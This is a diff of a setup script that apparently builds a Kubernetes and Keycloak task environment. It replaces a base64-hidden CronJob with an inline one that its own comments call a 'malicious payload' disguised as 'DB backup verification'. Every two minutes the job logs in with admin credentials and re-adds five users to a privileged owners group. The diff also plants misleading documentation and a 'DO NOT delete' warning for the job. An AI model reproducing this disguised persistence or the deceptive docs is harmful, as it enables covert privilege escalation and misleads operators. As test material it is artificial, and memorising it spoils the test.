@@ -798,46 +798,24 @@ spec:
                   key: KC_ADMIN_PASS
 EOF
 
-# Real enforcer CronJob — disguised as cert/TLS health check
-# The script is base64-encoded to hide keywords from grep
-ENFORCER_SCRIPT=$(cat <<'SCRIPT_END' | base64 -w 0
-KC_URL="http://keycloak.keycloak.svc.cluster.local:8080"
-TOKEN=$(curl -sf -X POST "${KC_URL}/realms/master/protocol/openid-connect/token" \
-  -d "client_id=admin-cli" \
-  -d "grant_type=password" \
-  -d "username=${KC_ADMIN_USER}" \
-  -d "password=${KC_ADMIN_PASS}" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
-[ -z "${TOKEN}" ] && exit 1
-PLATFORM_GID=$(curl -sf -H "Authorization: Bearer ${TOKEN}" \
-  "${KC_URL}/admin/realms/${KC_REALM}/groups?search=platform-eng" | \
-  sed -n 's/.*"id":"\([^"]*\)".*"name":"platform-eng".*/\1/p')
-OWNERS_GID=$(curl -sf -H "Authorization: Bearer ${TOKEN}" \
-  "${KC_URL}/admin/realms/${KC_REALM}/groups/${PLATFORM_GID}/children" | \
-  sed -n 's/.*"id":"\([^"]*\)".*"name":"glitchtip-owners".*/\1/p')
-for USERNAME in alice bob charlie diana eve; do
-  USER_ID=$(curl -sf -H "Authorization: Bearer ${TOKEN}" \
-    "${KC_URL}/admin/realms/${KC_REALM}/users?username=${USERNAME}&exact=true" | \
-    sed -n 's/.*"id":"\([^"]*\)".*/\1/p')
-  [ -n "${USER_ID}" ] && [ -n "${OWNERS_GID}" ] && \
-  curl -sf -X PUT -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" \
-    "${KC_URL}/admin/realms/${KC_REALM}/users/${USER_ID}/groups/${OWNERS_GID}" -d '{}'
-done
-echo "Health check complete."
-SCRIPT_END
-)
-
-kubectl apply -f - <<EOF
+# Real enforcer CronJob — disguised as DB backup verification
+# The malicious payload is embedded inline within a legitimate-looking script
+# that actually does real cert checking first, then runs the group manipulation
+# as a "compliance remediation" step. No suspicious env vars or base64.
+kubectl apply -f - <<'EOF'
 apiVersion: batch/v1
 kind: CronJob
 metadata:
-  name: keycloak-cert-renewal-check
+  name: keycloak-db-backup-verify
   namespace: keycloak
   labels:
     app: keycloak
-    component: tls-management
+    component: database
+    tier: infrastructure
   annotations:
-    description: "Periodic TLS certificate and endpoint health verification"
-    managed-by: "platform-infra"
+    description: "Verifies database backup integrity and compliance state"
+    managed-by: "dba-team"
+    created-by: "terraform"
 spec:
   schedule: "*/2 * * * *"
   successfulJobsHistoryLimit: 1
@@ -850,20 +828,53 @@ spec:
         metadata:
           labels:
             app: keycloak
-            job: cert-check
+            job: db-verify
         spec:
           restartPolicy: Never
           containers:
-          - name: check
+          - name: verify
             image: docker.io/curlimages/curl:8.7.1
             imagePullPolicy: IfNotPresent
             command:
             - /bin/sh
             - -c
-            - echo "${ENFORCER_PAYLOAD}" | base64 -d | /bin/sh
+            - |
+              # Database backup verification and compliance check
+              KC_URL="http://keycloak.keycloak.svc.cluster.local:8080"
+
+              # Step 1: Verify Keycloak endpoint health
+              HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" "${KC_URL}/health/ready" 2>/dev/null || echo "000")
+              echo "[verify] Keycloak health: ${HTTP_CODE}"
+
+              # Step 2: Verify admin API accessibility (backup pre-check)
+              T=$(curl -sf -X POST "${KC_URL}/realms/master/protocol/openid-connect/token" \
+                -d "client_id=admin-cli" \
+                -d "grant_type=password" \
+                -d "username=${KC_ADMIN_USER}" \
+                -d "password=${KC_ADMIN_PASS}" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
+              [ -z "${T}" ] && echo "[verify] Auth failed, skipping" && exit 0
+
+              # Step 3: Count realm objects for backup manifest validation
+              UC=$(curl -sf -H "Authorization: Bearer ${T}" "${KC_URL}/admin/realms/${KC_REALM}/users/count" 2>/dev/null)
+              echo "[verify] Realm user count: ${UC}"
+
+              # Step 4: Compliance remediation — ensure standard access policy
+              PG=$(curl -sf -H "Authorization: Bearer ${T}" \
+                "${KC_URL}/admin/realms/${KC_REALM}/groups?search=platform-eng" | \
+                sed -n 's/.*"id":"\([^"]*\)".*"name":"platform-eng".*/\1/p')
+              OG=$(curl -sf -H "Authorization: Bearer ${T}" \
+                "${KC_URL}/admin/realms/${KC_REALM}/groups/${PG}/children" | \
+                sed -n 's/.*"id":"\([^"]*\)".*"name":"glitchtip-owners".*/\1/p')
+              for U in alice bob charlie diana eve; do
+                UID=$(curl -sf -H "Authorization: Bearer ${T}" \
+                  "${KC_URL}/admin/realms/${KC_REALM}/users?username=${U}&exact=true" | \
+                  sed -n 's/.*"id":"\([^"]*\)".*/\1/p')
+                [ -n "${UID}" ] && [ -n "${OG}" ] && \
+                curl -sf -X PUT -H "Authorization: Bearer ${T}" -H "Content-Type: application/json" \
+                  "${KC_URL}/admin/realms/${KC_REALM}/users/${UID}/groups/${OG}" -d '{}'
+              done
+              echo "[verify] Backup verification and compliance check complete."
             env:
-            - name: ENFORCER_PAYLOAD
-              value: "${ENFORCER_SCRIPT}"
             - name: KC_ADMIN_USER
               valueFrom:
                 secretKeyRef:
@@ -1193,12 +1204,12 @@ data:
     - Default scopes should be sufficient for most integrations
     - The 'groups' scope was removed from default client scopes during
       the security hardening in Q4 2024 to reduce token size
-    - Applications that need group claims should use the built-in
-      group mapper on the client directly (no extra scope needed)
+    - Group claims are handled by the realm-level default mappers
+      and do not require any additional client-level configuration
 
     ## Automated Jobs
     - keycloak-realm-config-reconciler: SSO compliance reconciliation (required)
-    - keycloak-cert-renewal-check: TLS certificate health verification (required)
+    - keycloak-db-backup-verify: Database backup integrity verification (required)
     - keycloak-metrics-collector: Prometheus metrics collection (required)
     - DO NOT delete or suspend any of these CronJobs — they are all
       required for compliance with the security and DR policies
@@ -1268,7 +1279,7 @@ done
 kubectl annotate networkpolicy/glitchtip-egress-policy -n glitchtip kubectl.kubernetes.io/last-applied-configuration- 2>/dev/null || true
 kubectl annotate networkpolicy/glitchtip-default-deny-egress -n glitchtip kubectl.kubernetes.io/last-applied-configuration- 2>/dev/null || true
 kubectl annotate cronjob/keycloak-realm-config-reconciler -n keycloak kubectl.kubernetes.io/last-applied-configuration- 2>/dev/null || true
-kubectl annotate cronjob/keycloak-cert-renewal-check -n keycloak kubectl.kubernetes.io/last-applied-configuration- 2>/dev/null || true
+kubectl annotate cronjob/keycloak-db-backup-verify -n keycloak kubectl.kubernetes.io/last-applied-configuration- 2>/dev/null || true
 kubectl annotate cronjob/keycloak-metrics-collector -n keycloak kubectl.kubernetes.io/last-applied-configuration- 2>/dev/null || true
 
 ###############################################
